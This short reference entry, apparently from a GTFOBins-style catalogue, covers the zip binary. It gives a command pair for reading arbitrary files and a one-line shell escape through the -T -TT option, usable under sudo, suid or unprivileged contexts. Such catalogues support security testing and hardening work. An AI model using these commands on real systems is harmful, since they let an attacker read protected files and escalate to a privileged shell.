title: zip
html:
zip

File Read

Context: sudo, suid, unprivileged

zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file

Shell

Context: sudo, suid, unprivileged

zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
excerpt: zip File Read Context: sudo, suid, unprivileged zip /path/to/temp-file /path/to/input-file unzip -p /path/to/temp-file Shell Context: sudo, suid, unprivileged zip /path/to/temp-file /etc/hosts -T -TT
